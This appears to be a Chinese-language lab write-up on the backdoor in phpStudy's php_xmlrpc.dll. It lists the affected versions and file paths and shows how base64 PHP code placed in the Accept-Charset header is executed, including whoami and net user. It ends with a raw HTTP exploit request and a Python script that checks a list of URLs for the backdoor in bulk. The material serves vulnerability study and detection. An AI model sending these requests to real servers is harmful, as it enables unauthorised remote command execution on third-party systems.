<a name="NUBGS"></a>
# phpstudy后门
一直安装了phpstudy这个玩意，但没想到这个集成工具还有后门漏洞，于是我一探究竟，环境启动<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620299916305-eef1ff07-6b3e-4574-982e-1f6a6b9e1838.png#align=left&display=inline&height=399&originHeight=399&originWidth=459&status=done&style=none&width=459)<br />查了下资料，漏洞版本和路径主要如下

phpstudy 2016版php-5.4<br />phpstudy 2018版php-5.2.17<br />phpstudy 2018版php-5.4.45

phpStudy2016路径：<br />php\php-5.2.17\ext\php_xmlrpc.dll<br />php\php-5.4.45\ext\php_xmlrpc.dll

phpStudy2018路径：<br />PHPTutorial\php\php-5.2.17\ext\php_xmlrpc.dll<br />PHPTutorial\php\php-5.4.45\ext\php_xmlrpc.dll

php\php-5.2.17\ext\php_xmlrpc.dll 查找@eval如下图所示证明漏洞存在<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620299916703-b1bc0b79-a2ce-4d05-8f3e-e208f34c3fa5.png#align=left&display=inline&height=615&originHeight=615&originWidth=1181&status=done&style=none&width=1181)

如下图箭头所指的是phpinfo();的base64编码(Accept-Charset:) 这里需要注意的一个坑点在于Accept-Encoding:gzip,deflate中 gzip和deflate前面的空格需要去掉才可以执行命令。<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620299917281-eade8260-265a-4a4c-af36-c2a8aa73d01b.png#align=left&display=inline&height=630&originHeight=630&originWidth=1228&status=done&style=none&width=1228)

命令执行echo system("whoami && net user"); base64编码<br />![](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620299917882-a4608d6a-5870-4518-801a-3f0a1432d538.png#align=left&display=inline&height=490&originHeight=490&originWidth=1213&status=done&style=none&width=1213)

<a name="hYM63"></a>
## EXP
```python
GET /index.php HTTP/1.1
Host: 192.168.201.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding:gzip,deflate
Accept-Charset:cGhwaW5mbygpOw==
Connection: close
Upgrade-Insecure-Requests: 1
```
<a name="lAwNi"></a>
## 批量脚本
```python
import requests

def getTitle(url):
    #url = input("请输入url：")
    #url = 'http://192.168.201.1/index.php'
    headers = {
            'Connection': 'close',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Encoding':'gzip,deflate',
            'Accept-Charset':'ZWNobyAiSGVsbG8gYXVmZW5nIjs=',
            'Accept-Language': 'zh-CN,zh;q=0.8',
            }
    #req = requests.get(url=url,headers=headers)
    #r = req.text
    #print(r)
    try:
        req = requests.get(url=url,headers=headers)
        if req.status_code == 200:
            if 'aufeng' in req.text:
                print(url+"存在phpstudy后门++++++++++")
            else:
                print("没有phpstudy后门")
    except:
        print("请求出了问题")

if __name__ == '__main__':
    banner='''
    

               __                 
              / _|                
   __ _ _   _| |_ ___ _ __   __ _ 
  / _` | | | |  _/ _ \ '_ \ / _` |
 | (_| | |_| | ||  __/ | | | (_| |    by aufeng 
  \__,_|\__,_|_| \___|_| |_|\__, |    phpstudy后门批量检测小脚本
                             __/ |    Tips ：python studypiliang.py 确定键之后输入txt即可
                            |___/ 


    '''
    print(banner)
    #getTitle()
    filename = input("放入txt文本: ")
    if filename is not None:
        print("开始批量验证:")
        with open(filename, 'r',encoding='utf-8') as f:
            line = f.readlines()
            for i in line:
                a = i.strip() 
                getTitle(a)
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1345801/1620300428677-20345e87-1e71-4377-b057-74d4ad02ba65.png#align=left&display=inline&height=399&originHeight=532&originWidth=946&size=121032&status=done&style=none&width=710)
